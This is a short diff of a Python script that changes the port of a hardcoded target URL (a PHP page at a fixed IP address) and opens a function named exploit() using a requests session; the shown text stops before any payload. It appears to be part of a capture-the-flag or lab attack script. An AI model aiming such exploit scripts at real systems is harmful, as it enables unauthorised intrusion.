@@ -1,7 +1,7 @@
 import requests
 import base64
 
-TARGET_URL = "http://124.16.75.117:51007/index.php"
+TARGET_URL = "http://124.16.75.117:51001/index.php"
 
 def exploit():
         with requests.Session() as session:
